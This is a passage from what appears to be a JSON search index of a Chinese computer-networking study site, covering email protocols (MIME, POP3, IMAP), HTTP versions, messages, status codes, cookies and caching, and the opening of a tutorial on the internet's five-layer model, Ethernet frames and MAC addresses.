\u7801\u6587\u672c\u7684\u95ee\u9898\uff0c\u63d0\u51fa\u4e86\u591a\u7528\u9014\u56e0\u7279\u7f51\u90ae\u4ef6\u6269\u5c55 MIME\u3002\u5c31\u662f\u53d1\u4ef6\u548c\u6536\u4ef6\u524d\uff0c\u5148\u628a\u591a\u5a92\u4f53\u8f6c\u6362\u6210 ASCII \u7801\uff0c\u6536\u4ef6\u540e\uff0c\u5c06 ASCII \u53cd\u5411\u8f6c\u6362\u6210\u591a\u5a92\u4f53\u6587\u4ef6\u3002MIME \u4e5f\u7528\u4e8e HTTP \u8bf7\u6c42\u4e2d\uff0c\u591a\u5a92\u4f53\u8f6c\u6362\u6210 ASCII \u7684\u95ee\u9898\u3002</p> <p>MIME\uff1a1\u3001\u589e\u52a0\u4e865\u4e2a\u65b0\u7684\u90ae\u4ef6\u9996\u90e8\u5b57\u6bb5\uff08\u63d0\u4f9b\u4e86\u90ae\u4ef6\u4e3b\u4f53\u7684\u4fe1\u606f\uff09\u30022\u3001\u5b9a\u4e49\u4e86\u8bb8\u591a\u90ae\u4ef6\u5185\u5bb9\u7684\u683c\u5f0f\uff08\u5bf9\u591a\u5a92\u4f53\u90ae\u4ef6\u8fdb\u884c\u6807\u51c6\u5316\uff093\u3001\u5b9a\u4e49\u4e86\u4f20\u8f93\u7f16\u7801\uff0c\u5bf9\u4efb\u4f55\u5185\u5bb9\u683c\u5f0f\u8fdb\u884c\u8f6c\u6362\u3002</p>"},{"location":"ebook-network-basic/06%20%E5%BA%94%E7%94%A8%E5%B1%82/#pop3","title":"POP3\u534f\u8bae","text":"<p>POP \u534f\u8bae\uff0c3\u8868\u793a\u7b2c\u4e09\u4e2a\u7248\u672c\uff0c\u662f\u56e0\u7279\u7f51\u7684\u6b63\u5f0f\u6807\u51c6\uff0c\u529f\u80fd\u7b80\u5355\u6709\u9650\uff08\u7528\u6237\u53ea\u80fd\u4e0b\u8f7d\u5230\u672c\u5730\uff0c\u7ba1\u7406\u90ae\u4ef6\uff09</p> <p>\u7528\u6237\u53ea\u80fd\u4e0b\u8f7d\u5e76\u5220\u9664\uff0c\u6216\u8005\u4e0b\u8f7d\u5e76\u4fdd\u7559\u7684\u65b9\u5f0f\uff0c\u4ece\u90ae\u4ef6\u670d\u52a1\u5668\u4e0b\u8f7d\u5230\u672c\u5730\u8ba1\u7b97\u673a\uff0c\u4e0d\u5141\u8bb8\u5728\u90ae\u4ef6\u670d\u52a1\u5668\u4e0a\u7ba1\u7406\u81ea\u5df1\u7684\u90ae\u4ef6\uff08\u4e0d\u652f\u6301\u521b\u5efa\u6587\u4ef6\u5939\u548c\u7ba1\u7406\u81ea\u5df1\u7684\u90ae\u4ef6\uff09\u3002</p>"},{"location":"ebook-network-basic/06%20%E5%BA%94%E7%94%A8%E5%B1%82/#imap","title":"IMAP\u534f\u8bae","text":"<p>\u5f53\u524d\u662f IMAP4 \uff0c\u529f\u80fd\u5f3a\u5927\uff0c\u662f\u56e0\u7279\u7f51\u7684\u5efa\u8bae\u6807\u51c6\uff08\u7528\u6237\u53ef\u4ee5\u5728\u670d\u52a1\u5668\u4e0a\u7ba1\u7406\u81ea\u5df1\u7684\u90ae\u4ef6\uff09\u662f\u4e00\u4e2a\u8054\u673a\u534f\u8bae\u3002</p> <p>POP3\u548cIMAP4\u90fd\u57fa\u4e8e TCP \u8fde\u63a5\u7684\u5ba2\u6237\u7aef\u670d\u52a1\u5668\u6a21\u5f0f\uff0cPOP3\u4f7f\u7528110 \u7aef\u53e3\uff0cIMAP\u4f7f\u7528143\u7aef\u53e3\u3002</p>"},{"location":"ebook-network-basic/06%20%E5%BA%94%E7%94%A8%E5%B1%82/#www","title":"\u57fa\u4e8eWWW\u7684\u7535\u5b50\u90ae\u4ef6","text":"<p>\u901a\u8fc7\u6d4f\u89c8\u5668\u767b\u5f55\u64cd\u4f5c\u7535\u5b50\u90ae\u4ef6\uff0c\u548c IMAP \u7c7b\u4f3c\uff0c\u65e0\u9700\u672c\u5730\u5b89\u88c5\u4e13\u95e8\u7684\u7528\u6237\u4ee3\u7406\u7a0b\u5e8f\uff0c\u6b64\u65f6\u7528\u6237A\u5230A\u670d\u52a1\u5668\u4e4b\u95f4\u4f7f\u7528 HTTP \u534f\u8bae\uff0cA\u670d\u52a1\u5668\u5230B\u670d\u52a1\u5668\u4f7f\u7528 SMTP \u534f\u8bae\uff0cB\u670d\u52a1\u5668\u5230B\u6d4f\u89c8\u5668\u4f7f\u7528HTTP\u534f\u8bae\u5373\u53ef\u3002</p>"},{"location":"ebook-network-basic/06%20%E5%BA%94%E7%94%A8%E5%B1%82/#67-www","title":"6.7 \u4e07\u7ef4\u7f51WWW","text":"<p>\u4e07\u7ef4\u7f51\u662f\u4e92\u8054\u7f51\u4e0a\u5206\u5e03\u5f0f\u5e94\u7528\uff0c\u901a\u8fc7\u8d85\u94fe\u63a5\u5c06\u4e0d\u540c\u7f51\u9875\u8fde\u63a5\u8d77\u6765\u7684\u7f51\u7edc\u3002</p> <p>\u6d4f\u89c8\u5668\u5185\u6838\uff08\u6e32\u67d3\u5f15\u64ce\uff09\u8d1f\u8d23\u7f51\u9875\u7684\u89e3\u6790\u548c\u663e\u793a\u3002\u4e0d\u540c\u6d4f\u89c8\u5668\u7684\u5185\u6838\u4e0d\u540c\uff0c\u89e3\u6790\u663e\u793a\u4ee3\u7801\u7684\u7ed3\u679c\u4e0d\u540c\uff0c\u9020\u6210\u4e86\u6d4f\u89c8\u5668\u517c\u5bb9\u6027\u95ee\u9898\u3002</p> <p>URL\uff1a\u7edf\u4e00\u8d44\u6e90\u5b9a\u4f4d\u7b26\uff0c\u534f\u8bae\uff1a\u4e3b\u673a\uff1a\u7aef\u53e3\u3001\u8def\u5f84</p> <p>HTTP 1.0 \u7248\u672c\uff1a\u975e\u6301\u7eed\u8fde\u63a5\u7684\u65b9\u5f0f\uff1a\u6bcf\u6b21\u8bf7\u6c42\u9700\u8981\u5efa\u7acb TCP \u8fde\u63a5\uff0c\u8bf7\u6c42\u7ed3\u675f\u540e\uff0c\u65ad\u5f00\u8fde\u63a5\u3002\u8bf7\u6c42\u4e00\u4e2a\u6587\u4ef6\u9700\u8981 2RTT + \u6587\u4ef6\u4f20\u8f93\u65f6\u95f4\uff08TCP\u4e09\u6b21\u63e1\u624b\uff09\u3002\u5982\u679c\u5e76\u884c\u8bf7\u6c42\u8d44\u6e90\uff0c\u90a3\u4e48TCP\u8fde\u63a5\u8f83\u591a\uff0c\u5bf9\u670d\u52a1\u5668\u7684\u6027\u80fd\u5f71\u54cd\u8f83\u5927\u3002</p> <p>HTTP 1.1 \u7248\u672c\uff1a\u6301\u7eed\u8fde\u63a5\u3002TCP\u5efa\u7acb\u8fde\u63a5\u540e\uff0c\u670d\u52a1\u5668\u53d1\u9001\u76f8\u5e94\u540e\uff0c\u4ecd\u7136\u4fdd\u6301TCP\u8fde\u63a5\uff0c\u540c\u4e00\u4e2a\u6d4f\u89c8\u5668\u540e\u7eed\u7684 HTTP \u8bf7\u6c42\u4ecd\u7136\u4f7f\u7528\u8fd9\u4e2a\u8fde\u63a5\uff0c\u53ea\u8981\u8bf7\u6c42\u7684\u8d44\u6e90\u5728\u540c\u4e00\u4e2a\u670d\u52a1\u5668\u4e0a\u5373\u53ef\u3002\u8fd9\u6837\u5927\u5927\u51cf\u5c11\u4e86 TCP \u8bf7\u6c42\u7684\u6570\u91cf\u3002TCP \u6301\u7eed\u8fde\u63a5\u4ee5\u6d41\u6c34\u7ebf\u5f62\u5f0f\u5de5\u4f5c\uff0c\u5373\u6d4f\u89c8\u5668\u5f02\u6b65\u53d1\u9001\u8bf7\u6c42\uff0c\u53ef\u4ee5\u8fde\u7eed\u53d1\u9001\u591a\u4e2a\u8bf7\u6c42\u62a5\u6587\uff0c\u591a\u4e2a\u8fde\u7eed\u62a5\u6587\u5230\u8fbe\u670d\u52a1\u5668\u540e\uff0c\u670d\u52a1\u5668\u53d1\u56de\u591a\u4e2a\u54cd\u5e94\u62a5\u6587\uff0c\u8fd9\u6837\u8282\u7701\u4e86\u5f88\u591a RTT \u65f6\u95f4\uff0c\u4f7f TCP \u8fde\u63a5\u4e2d\u7a7a\u95f2\u65f6\u95f4\u51cf\u5c11\u3002</p> <p>TCP \u8fde\u63a5\u7684\u7aef\u53e3\u53f7\u9ed8\u8ba4\u662f 80 \u7aef\u53e3</p> <p>HTTP \u62a5\u6587\u662f\u9762\u5411\u6587\u672c\u7684\uff0c\u5176\u4e2d\u6bcf\u4e00\u4e2a\u5b57\u6bb5\u90fd\u662f ASCII \u4e32\u7801\uff0c\u6bcf\u4e2a\u5b57\u6bb5\u957f\u5ea6\u90fd\u4e0d\u662f\u56fa\u5b9a\u7684\u3002</p> <pre><code>\u8bf7\u6c42\u62a5\u6587\uff1a\n\u8bf7\u6c42\u884c\uff1a\u65b9\u6cd5 + URL + \u7248\u672c\n\u9996\u90e8\u884c\uff1a\u5b57\u6bb5\u540d+\u503c \uff08\u53ef\u80fd\u6709\u591a\u4e2a\u5b57\u6bb5\uff09\n\u5b9e\u4f53\u4e3b\u4f53\uff1a\u901a\u5e38\u4e0d\u7528\n\nGET /index.html HTTP/1.1\nHost: www.baidu.com (\u670d\u52a1\u5668\u7684\u57df\u540d)\nConnection: close/keep-alive \uff08\u670d\u52a1\u5668\u53d1\u9001\u76f8\u5e94\u540e\uff0c\u53ef\u4ee5\u91ca\u653e\u8fde\u63a5\uff09\nUser-Agent: Mozilla/5.0\uff08\u6d4f\u89c8\u5668\u7c7b\u578b\u548c\u7248\u672c\uff09\nAccept-Language: cn\uff08\u7528\u6237\u4f18\u5148\u83b7\u53d6\u4e2d\u6587\u7248\u672c\u7684\u6587\u6863\uff09\n\u8be5 HTTP \u8bf7\u6c42\u6ca1\u6709\u5b9e\u4f53\u4e3b\u4f53\n</code></pre> <p>\u8bf7\u6c42\u65b9\u6cd5\uff1aget\u3001post\u3001head\u3001put\u3001delete\u3001connect\u3001options\u3001trace\u3001patch</p> <pre><code>\u54cd\u5e94\u62a5\u6587\n\u72b6\u6001\u884c\uff1a\u7248\u672c+\u72b6\u6001\u7801+\u77ed\u8bed\n\u9996\u90e8\u884c\uff1a\u5b57\u6bb5\u540d+\u503c\n</code></pre> <p>\u72b6\u6001\u7801</p> <ul> <li>1xx \u8bf7\u6c42\u6536\u5230\uff0c\u6b63\u5728\u8fdb\u884c\u5904\u7406</li> <li>2xx \u8bf7\u6c42\u6210\u529f</li> <li>3xx \u91cd\u5b9a\u5411\uff0c\u5b8c\u6210\u8bf7\u6c42\u8fd8\u5fc5\u987b\u91c7\u53d6\u8fdb\u4e00\u6b65\u884c\u52a8</li> <li>4xx \u5ba2\u6237\u7aef\u9519\u8bef</li> <li>5xx \u670d\u52a1\u5668\u9519\u8bef</li> </ul> <p>\u4f7f\u7528 cookie \u5728\u670d\u52a1\u5668\u4e0a\u8bb0\u5f55\u7528\u6237\u4fe1\u606f\uff1a\u7f51\u9875\u9700\u8981\u8bb0\u4f4f\u7528\u6237\u540d\uff0c\u5177\u4f53\u6d41\u7a0b</p> <ol> <li>\u6d4f\u89c8\u5668\u5e26\u7740 userID \u53d1\u51fa HTTP \u8bf7\u6c42</li> <li>\u670d\u52a1\u5668\u7aef\u6839\u636e userID\uff0c\u751f\u6210\u4e00\u4e2a\u552f\u4e00\u7684 Cookie\uff0c\u5728\u670d\u52a1\u5668\u7aef\u6570\u636e\u5e93\u521b\u5efa\u4e00\u4e2a\u9879\u76ee\uff0c\u8bb0\u5f55\u7528\u6237\u8bbf\u95ee\u7f51\u7ad9\u7684\u5404\u79cd\u4fe1\u606f</li> <li>\u670d\u52a1\u5668\u8fd4\u56de set-Cookie \u5b57\u6bb5</li> <li>\u6d4f\u89c8\u5668\u5c06 cookie \u5b58\u5165\u6587\u4ef6</li> <li>\u6d4f\u89c8\u5668\u518d\u6b21\u8bf7\u6c42\u65f6\uff0c\u5728\u8bf7\u6c42\u4e2d\u5e26\u5165 cookie</li> <li>\u670d\u52a1\u5668\u6839\u636e cookie\uff0c\u8bc6\u522b\u7528\u6237\uff0c\u8fd4\u56de\u4e2a\u6027\u5316\u7684\u7528\u6237\u7f51\u9875</li> <li>\u6d4f\u89c8\u5668\u89e3\u6790\u4e2a\u6027\u5316\u7684\u7f51\u9875</li> </ol> <p>\u4e07\u7ef4\u7f51\u7f13\u5b58\uff08web \u7f13\u5b58\uff09\uff1a\u4f7f\u7528\u7f13\u5b58\u673a\u5236\uff0c\u63d0\u9ad8\u7f51\u7edc\u6548\u7387\u3002\u8bf7\u6c42\u53ef\u4ee5\u7f13\u5b58\u5230\u672c\u5730\u5ba2\u6237\u7aef\uff0c\u6216\u8005\u7f13\u5b58\u5230\u4e2d\u95f4\u7cfb\u7edf\u4e0a\uff08\u4ee3\u7406\u670d\u52a1\u5668\uff09\u3002web \u7f13\u5b58\u628a\u6700\u8fd1\u7684\u8bf7\u6c42\u653e\u5728\u672c\u5730\u78c1\u76d8\u4e2d\u3002\u5f53\u65b0\u8bf7\u6c42\u5230\u8fbe\u65f6\uff0c\u5982\u679c\u65b0\u7684\u8bf7\u6c42\u548c\u6682\u65f6\u5b58\u653e\u7684\u8bf7\u6c42\u76f8\u540c\uff0c\u5c31\u8fd4\u56de\u6682\u5b58\u7684\u8bf7\u6c42\uff0c\u4e0d\u9700\u8981\u6309\u7167 URL \u5730\u5740\u518d\u6b21\u5411\u8fdc\u7a0b\u670d\u52a1\u5668\u53d1\u9001\u8bf7\u6c42\u3002</p> <p>\u7f13\u5b58\u8fc7\u671f\u65f6\u95f4\uff1a\u5982\u679c\u771f\u5b9e\u7684\u6587\u6863\u5df2\u7ecf\u6539\u53d8\uff0c\u7528\u6237\u8fd8\u4ece\u7f13\u5b58\u4e2d\u83b7\u53d6\uff0c\u90a3\u4e48\u65e0\u6cd5\u83b7\u53d6\u6700\u65b0\u7684\u6587\u6863\uff0c\u5c31\u51fa\u9519\u4e86\u3002\u6240\u4ee5\u8bbe\u7f6e\u4e00\u4e2a\u7f13\u5b58\u5224\u65ad\uff0c\u5728\u8bf7\u6c42\u62a5\u6587\u4e2d\u589e\u52a0 If-modified-since \u7528\u6765\u6807\u8bc6\u8fc7\u671f\u65f6\u95f4\u3002\u5982\u679c\u8bf7\u6c42\u7684\u8d44\u6e90\u5df2\u7ecf\u8fc7\u671f\uff0c\u90a3\u4e48\u518d\u4ece\u8fdc\u7a0b\u670d\u52a1\u5668\u4e2d\u83b7\u53d6\u8d44\u6e90\uff08304 Not Modified\uff09</p> <pre><code>\u4f8b\u5b50\uff1a\u5982\u679c\u4e00\u4e2a\u7f51\u9875\u6709\u4e24\u4e2a\u5c0f\u56fe\u7247\uff0c\u4ee5\u975e\u6d41\u6c34\u7ebf\u6301\u7eed\u8fde\u63a5\u7684\u65b9\u5f0f\uff0c\u7528\u65f6\u591a\u5c11\u4e2a RTT\uff1f\n\u89e3\u6cd5\uff1a4\u4e2a RTT\u3002\u9996\u5148\u4e00\u4e2aTCP\uff0c\u7136\u540e\u8bf7\u6c42 HTML\uff0c\u7136\u540e\u8bf7\u6c42\u4e24\u4e2a\u56fe\u7247\uff08\u975e\u6d41\u6c34\u7ebf\uff09\u3002\u6301\u7eed\u8fde\u63a5\uff0c\u540e\u9762\u8bf7\u6c42\u4e0d\u9700\u8981\u91cd\u65b0 TCP \u8fde\u63a5\u3002\n</code></pre>"},{"location":"ebook-network-basic/readme/","title":"\u8ba1\u7b97\u673a\u7f51\u7edc\u5fae\u8bfe\u5802","text":"<p>\u7edf\u8ba1\u4fe1\u606f\uff1a\u5b57\u6570 201  \u9605\u8bfb1\u5206\u949f</p> <p>\u89c6\u9891\u94fe\u63a5\uff1ahttps://www.bilibili.com/video/BV1c4411d7jb</p> <p>\u6e56\u5357\u79d1\u6280\u5927\u5b66\u51fa\u54c1 2019\u5e74\uff0c\u7f51\u4e0a\u8bc4\u4ef7\u5f88\u597d\uff0c\u8001\u5e08\u8bb2\u7684\u5f88\u7ec6\u81f4\uff0c\u4e5f\u53ef\u4ee5\u53c2\u8003\u672c\u5730\u7684\u7eb8\u8d28\u4e66</p>"},{"location":"ebook-network-basic/todo%20%E4%BA%92%E8%81%94%E7%BD%91%E5%8D%8F%E8%AE%AE%E5%85%A5%E9%97%A8-%E9%98%AE%E4%B8%80%E5%B3%B0/","title":"\u4e92\u8054\u7f51\u534f\u8bae\u5165\u95e8\uff08\u4e00\uff09","text":"<p>\u7edf\u8ba1\u4fe1\u606f\uff1a\u5b57\u6570 27596  \u9605\u8bfb56\u5206\u949f</p> <p>\u4f5c\u8005\uff1a \u962e\u4e00\u5cf0</p> <p>\u65e5\u671f\uff1a 2012\u5e745\u670831\u65e5</p> <p>\u6211\u4eec\u6bcf\u5929\u4f7f\u7528\u4e92\u8054\u7f51\uff0c\u4f60\u662f\u5426\u60f3\u8fc7\uff0c\u5b83\u662f\u5982\u4f55\u5b9e\u73b0\u7684\uff1f</p> <p>\u5168\u4e16\u754c\u51e0\u5341\u4ebf\u53f0\u7535\u8111\uff0c\u8fde\u63a5\u5728\u4e00\u8d77\uff0c\u4e24\u4e24\u901a\u4fe1\u3002\u4e0a\u6d77\u7684\u67d0\u4e00\u5757\u7f51\u5361\u9001\u51fa\u4fe1\u53f7\uff0c\u6d1b\u6749\u77f6\u7684\u53e6\u4e00\u5757\u7f51\u5361\u5c45\u7136\u5c31\u6536\u5230\u4e86\uff0c\u4e24\u8005\u5b9e\u9645\u4e0a\u6839\u672c\u4e0d\u77e5\u9053\u5bf9\u65b9\u7684\u7269\u7406\u4f4d\u7f6e\uff0c\u4f60\u4e0d\u89c9\u5f97\u8fd9\u662f\u5f88\u795e\u5947\u7684\u4e8b\u60c5\u5417\uff1f</p> <p>\u4e92\u8054\u7f51\u7684\u6838\u5fc3\u662f\u4e00\u7cfb\u5217\u534f\u8bae\uff0c\u603b\u79f0\u4e3a\"\u4e92\u8054\u7f51\u534f\u8bae\"\uff08Internet Protocol Suite\uff09\u3002\u5b83\u4eec\u5bf9\u7535\u8111\u5982\u4f55\u8fde\u63a5\u548c\u7ec4\u7f51\uff0c\u505a\u51fa\u4e86\u8be6\u5c3d\u7684\u89c4\u5b9a\u3002\u7406\u89e3\u4e86\u8fd9\u4e9b\u534f\u8bae\uff0c\u5c31\u7406\u89e3\u4e86\u4e92\u8054\u7f51\u7684\u539f\u7406\u3002</p> <p>\u4e0b\u9762\u5c31\u662f\u6211\u7684\u5b66\u4e60\u7b14\u8bb0\u3002\u56e0\u4e3a\u8fd9\u4e9b\u534f\u8bae\u5b9e\u5728\u592a\u590d\u6742\u3001\u592a\u5e9e\u5927\uff0c\u6211\u60f3\u6574\u7406\u4e00\u4e2a\u7b80\u6d01\u7684\u6846\u67b6\uff0c\u5e2e\u52a9\u81ea\u5df1\u4ece\u603b\u4f53\u4e0a\u628a\u63e1\u5b83\u4eec\u3002\u4e3a\u4e86\u4fdd\u8bc1\u7b80\u5355\u6613\u61c2\uff0c\u6211\u505a\u4e86\u5927\u91cf\u7684\u7b80\u5316\uff0c\u6709\u4e9b\u5730\u65b9\u5e76\u4e0d\u5168\u9762\u548c\u7cbe\u786e\uff0c\u4f46\u662f\u5e94\u8be5\u80fd\u591f\u8bf4\u6e05\u695a\u4e92\u8054\u7f51\u7684\u539f\u7406\u3002</p> <p>\u4e92\u8054\u7f51\u534f\u8bae\u5165\u95e8</p> <p>\u4f5c\u8005\uff1a\u962e\u4e00\u5cf0</p> <p>\u4e00\u3001\u6982\u8ff0</p> <p>1.1 \u4e94\u5c42\u6a21\u578b</p> <p>\u4e92\u8054\u7f51\u7684\u5b9e\u73b0\uff0c\u5206\u6210\u597d\u51e0\u5c42\u3002\u6bcf\u4e00\u5c42\u90fd\u6709\u81ea\u5df1\u7684\u529f\u80fd\uff0c\u5c31\u50cf\u5efa\u7b51\u7269\u4e00\u6837\uff0c\u6bcf\u4e00\u5c42\u90fd\u9760\u4e0b\u4e00\u5c42\u652f\u6301\u3002</p> <p>\u7528\u6237\u63a5\u89e6\u5230\u7684\uff0c\u53ea\u662f\u6700\u4e0a\u9762\u7684\u4e00\u5c42\uff0c\u6839\u672c\u6ca1\u6709\u611f\u89c9\u5230\u4e0b\u9762\u7684\u5c42\u3002\u8981\u7406\u89e3\u4e92\u8054\u7f51\uff0c\u5fc5\u987b\u4ece\u6700\u4e0b\u5c42\u5f00\u59cb\uff0c\u81ea\u4e0b\u800c\u4e0a\u7406\u89e3\u6bcf\u4e00\u5c42\u7684\u529f\u80fd\u3002</p> <p>\u5982\u4f55\u5206\u5c42\u6709\u4e0d\u540c\u7684\u6a21\u578b\uff0c\u6709\u7684\u6a21\u578b\u5206\u4e03\u5c42\uff0c\u6709\u7684\u5206\u56db\u5c42\u3002\u6211\u89c9\u5f97\uff0c\u628a\u4e92\u8054\u7f51\u5206\u6210\u4e94\u5c42\uff0c\u6bd4\u8f83\u5bb9\u6613\u89e3\u91ca\u3002</p> <p></p> <p>\u5982\u4e0a\u56fe\u6240\u793a\uff0c\u6700\u5e95\u4e0b\u7684\u4e00\u5c42\u53eb\u505a\"\u5b9e\u4f53\u5c42\"\uff08Physical Layer\uff09\uff0c\u6700\u4e0a\u9762\u7684\u4e00\u5c42\u53eb\u505a\"\u5e94\u7528\u5c42\"\uff08Application Layer\uff09\uff0c\u4e2d\u95f4\u7684\u4e09\u5c42\uff08\u81ea\u4e0b\u800c\u4e0a\uff09\u5206\u522b\u662f\"\u94fe\u63a5\u5c42\"\uff08Link Layer\uff09\u3001\"\u7f51\u7edc\u5c42\"\uff08Network Layer\uff09\u548c\"\u4f20\u8f93\u5c42\"\uff08Transport Layer\uff09\u3002\u8d8a\u4e0b\u9762\u7684\u5c42\uff0c\u8d8a\u9760\u8fd1\u786c\u4ef6\uff1b\u8d8a\u4e0a\u9762\u7684\u5c42\uff0c\u8d8a\u9760\u8fd1\u7528\u6237\u3002</p> <p>\u5b83\u4eec\u53eb\u4ec0\u4e48\u540d\u5b57\uff0c\u5176\u5b9e\u5e76\u4e0d\u91cd\u8981\u3002\u53ea\u9700\u8981\u77e5\u9053\uff0c\u4e92\u8054\u7f51\u5206\u6210\u82e5\u5e72\u5c42\u5c31\u53ef\u4ee5\u4e86\u3002</p> <p>1.2 \u5c42\u4e0e\u534f\u8bae</p> <p>\u6bcf\u4e00\u5c42\u90fd\u662f\u4e3a\u4e86\u5b8c\u6210\u4e00\u79cd\u529f\u80fd\u3002\u4e3a\u4e86\u5b9e\u73b0\u8fd9\u4e9b\u529f\u80fd\uff0c\u5c31\u9700\u8981\u5927\u5bb6\u90fd\u9075\u5b88\u5171\u540c\u7684\u89c4\u5219\u3002</p> <p>\u5927\u5bb6\u90fd\u9075\u5b88\u7684\u89c4\u5219\uff0c\u5c31\u53eb\u505a\"\u534f\u8bae\"\uff08protocol\uff09\u3002</p> <p>\u4e92\u8054\u7f51\u7684\u6bcf\u4e00\u5c42\uff0c\u90fd\u5b9a\u4e49\u4e86\u5f88\u591a\u534f\u8bae\u3002\u8fd9\u4e9b\u534f\u8bae\u7684\u603b\u79f0\uff0c\u5c31\u53eb\u505a\"\u4e92\u8054\u7f51\u534f\u8bae\"\uff08Internet Protocol Suite\uff09\u3002\u5b83\u4eec\u662f\u4e92\u8054\u7f51\u7684\u6838\u5fc3\uff0c\u4e0b\u9762\u4ecb\u7ecd\u6bcf\u4e00\u5c42\u7684\u529f\u80fd\uff0c\u4e3b\u8981\u5c31\u662f\u4ecb\u7ecd\u6bcf\u4e00\u5c42\u7684\u4e3b\u8981\u534f\u8bae\u3002</p> <p>\u4e8c\u3001\u5b9e\u4f53\u5c42</p> <p>\u6211\u4eec\u4ece\u6700\u5e95\u4e0b\u7684\u4e00\u5c42\u5f00\u59cb\u3002</p> <p>\u7535\u8111\u8981\u7ec4\u7f51\uff0c\u7b2c\u4e00\u4ef6\u4e8b\u8981\u5e72\u4ec0\u4e48\uff1f\u5f53\u7136\u662f\u5148\u628a\u7535\u8111\u8fde\u8d77\u6765\uff0c\u53ef\u4ee5\u7528\u5149\u7f06\u3001\u7535\u7f06\u3001\u53cc\u7ede\u7ebf\u3001\u65e0\u7ebf\u7535\u6ce2\u7b49\u65b9\u5f0f\u3002</p> <p></p> <p>\u8fd9\u5c31\u53eb\u505a\"\u5b9e\u4f53\u5c42\"\uff0c\u5b83\u5c31\u662f\u628a\u7535\u8111\u8fde\u63a5\u8d77\u6765\u7684\u7269\u7406\u624b\u6bb5\u3002\u5b83\u4e3b\u8981\u89c4\u5b9a\u4e86\u7f51\u7edc\u7684\u4e00\u4e9b\u7535\u6c14\u7279\u6027\uff0c\u4f5c\u7528\u662f\u8d1f\u8d23\u4f20\u90010\u548c1\u7684\u7535\u4fe1\u53f7\u3002</p> <p>\u4e09\u3001\u94fe\u63a5\u5c42</p> <p>3.1 \u5b9a\u4e49</p> <p>\u5355\u7eaf\u76840\u548c1\u6ca1\u6709\u4efb\u4f55\u610f\u4e49\uff0c\u5fc5\u987b\u89c4\u5b9a\u89e3\u8bfb\u65b9\u5f0f\uff1a\u591a\u5c11\u4e2a\u7535\u4fe1\u53f7\u7b97\u4e00\u7ec4\uff1f\u6bcf\u4e2a\u4fe1\u53f7\u4f4d\u6709\u4f55\u610f\u4e49\uff1f</p> <p>\u8fd9\u5c31\u662f\"\u94fe\u63a5\u5c42\"\u7684\u529f\u80fd\uff0c\u5b83\u5728\"\u5b9e\u4f53\u5c42\"\u7684\u4e0a\u65b9\uff0c\u786e\u5b9a\u4e860\u548c1\u7684\u5206\u7ec4\u65b9\u5f0f\u3002</p> <p>3.2 \u4ee5\u592a\u7f51\u534f\u8bae</p> <p>\u65e9\u671f\u7684\u65f6\u5019\uff0c\u6bcf\u5bb6\u516c\u53f8\u90fd\u6709\u81ea\u5df1\u7684\u7535\u4fe1\u53f7\u5206\u7ec4\u65b9\u5f0f\u3002\u9010\u6e10\u5730\uff0c\u4e00\u79cd\u53eb\u505a\"\u4ee5\u592a\u7f51\"\uff08Ethernet\uff09\u7684\u534f\u8bae\uff0c\u5360\u636e\u4e86\u4e3b\u5bfc\u5730\u4f4d\u3002</p> <p>\u4ee5\u592a\u7f51\u89c4\u5b9a\uff0c\u4e00\u7ec4\u7535\u4fe1\u53f7\u6784\u6210\u4e00\u4e2a\u6570\u636e\u5305\uff0c\u53eb\u505a\"\u5e27\"\uff08Frame\uff09\u3002\u6bcf\u4e00\u5e27\u5206\u6210\u4e24\u4e2a\u90e8\u5206\uff1a\u6807\u5934\uff08Head\uff09\u548c\u6570\u636e\uff08Data\uff09\u3002</p> <p></p> <p>\"\u6807\u5934\"\u5305\u542b\u6570\u636e\u5305\u7684\u4e00\u4e9b\u8bf4\u660e\u9879\uff0c\u6bd4\u5982\u53d1\u9001\u8005\u3001\u63a5\u53d7\u8005\u3001\u6570\u636e\u7c7b\u578b\u7b49\u7b49\uff1b\"\u6570\u636e\"\u5219\u662f\u6570\u636e\u5305\u7684\u5177\u4f53\u5185\u5bb9\u3002</p> <p>\"\u6807\u5934\"\u7684\u957f\u5ea6\uff0c\u56fa\u5b9a\u4e3a18\u5b57\u8282\u3002\"\u6570\u636e\"\u7684\u957f\u5ea6\uff0c\u6700\u77ed\u4e3a46\u5b57\u8282\uff0c\u6700\u957f\u4e3a1500\u5b57\u8282\u3002\u56e0\u6b64\uff0c\u6574\u4e2a\"\u5e27\"\u6700\u77ed\u4e3a64\u5b57\u8282\uff0c\u6700\u957f\u4e3a1518\u5b57\u8282\u3002\u5982\u679c\u6570\u636e\u5f88\u957f\uff0c\u5c31\u5fc5\u987b\u5206\u5272\u6210\u591a\u4e2a\u5e27\u8fdb\u884c\u53d1\u9001\u3002</p> <p>3.3 MAC\u5730\u5740</p> <p>\u4e0a\u9762\u63d0\u5230\uff0c\u4ee5\u592a\u7f51\u6570\u636e\u5305\u7684\"\u6807\u5934\"\uff0c\u5305\u542b\u4e86\u53d1\u9001\u8005\u548c\u63a5\u53d7\u8005\u7684\u4fe1\u606f\u3002\u90a3\u4e48\uff0c\u53d1\u9001\u8005\u548c\u63a5\u53d7\u8005\u662f\u5982\u4f55\u6807\u8bc6\u5462\uff1f</p> <p>\u4ee5\u592a\u7f51\u89c4\u5b9a\uff0c\u8fde\u5165\u7f51\u7edc\u7684\u6240\u6709\u8bbe\u5907\uff0c\u90fd\u5fc5\u987b\u5177\u6709\"\u7f51\u5361\"\u63a5\u53e3\u3002\u6570\u636e\u5305\u5fc5\u987b\u662f\u4ece\u4e00\u5757\u7f51\u5361\uff0c\u4f20\u9001\u5230\u53e6\u4e00\u5757\u7f51\u5361\u3002\u7f51\u5361\u7684\u5730\u5740\uff0c\u5c31\u662f\u6570\u636e\u5305\u7684\u53d1\u9001\u5730\u5740\u548c\u63a5\u6536\u5730\u5740\uff0c\u8fd9\u53eb\u505aMAC\u5730\u5740\u3002</p> <p></p> <p>\u6bcf\u5757\u7f51\u5361\u51fa\u5382\u7684\u65f6\u5019\uff0c\u90fd\u6709\u4e00\u4e2a\u5168\u4e16\u754c\u72ec\u4e00\u65e0\u4e8c\u7684MAC\u5730\u5740\uff0c\u957f\u5ea6\u662f48\u4e2a\u4e8c\u8fdb\u5236\u4f4d\uff0c\u901a\u5e38\u752812\u4e2a\u5341\u516d\u8fdb\u5236\u6570\u8868\u793a\u3002</p> <p></p> 